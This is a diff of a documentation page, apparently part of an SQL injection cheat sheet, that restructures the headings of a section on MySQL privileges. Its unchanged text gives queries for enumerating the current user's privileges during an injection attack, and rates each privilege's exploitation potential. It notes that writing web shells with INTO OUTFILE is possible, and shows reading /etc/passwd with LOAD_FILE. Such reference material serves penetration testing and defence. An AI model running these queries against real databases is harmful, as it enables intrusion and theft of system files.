@@ -7,11 +7,9 @@ tags: ["privileges", "permissions", "file access"]
 lastUpdated: 2025-03-15
 ---
 
-## Privileges
-
 Understanding MySQL privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.
 
-### Checking Current User Privileges
+## Checking Current User Privileges
 
 To check what privileges the current database user has:
 
@@ -31,7 +29,7 @@ For table-specific privileges:
 SELECT privilege_type FROM information_schema.table_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'");
 ```
 
-### Important Privileges to Check
+## Important Privileges to Check
 
 | Privilege        | Description                      | Exploitation Potential                       |
 | ---------------- | -------------------------------- | -------------------------------------------- |
@@ -43,7 +41,7 @@ SELECT privilege_type FROM information_schema.table_privileges WHERE grantee = C
 | `RELOAD`         | Can reload server settings       | Can flush privileges                         |
 | `ALL PRIVILEGES` | All privileges (admin)           | Complete database control                    |
 
-### Checking for FILE Privilege
+## Checking for FILE Privilege
 
 The FILE privilege is particularly important as it allows reading from and writing to files on the server:
 
@@ -58,30 +56,30 @@ Or more generally using information_schema:
 SELECT 1 FROM information_schema.user_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'") AND privilege_type = 'FILE';
 ```
 
-### Checking for Specific Capabilities
+## Checking for Specific Capabilities
 
-#### Can you read files?
+### Can you read files?
 
 ```sql
 -- Returns 1 if you can read files
 SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
 ```
 
-#### Can you write files?
+### Can you write files?
 
 ```sql
 -- Same check as reading files (FILE privilege covers both)
 SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
 ```
 
-### Checking All Privileges at Once
+## Checking All Privileges at Once
 
 ```sql
 -- Show all privileges for current user
 SELECT * FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);
 ```
 
-### Practical Usage
+## Practical Usage
 
 If you have the FILE privilege, you can:
 
@@ -89,7 +87,7 @@ If you have the FILE privilege, you can:
 - Write web shells using `INTO OUTFILE`
 - Access database configuration files
 
-### Example: Checking and Using FILE Privilege
+## Example: Checking and Using FILE Privilege
 
 ```sql
 -- Check if we have FILE privilege
@@ -99,7 +97,7 @@ SELECT IF((SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), 
 SELECT LOAD_FILE('/etc/passwd');
 ```
 
-### Note
+## Note
 
 The actual privileges available to you depend on:
 
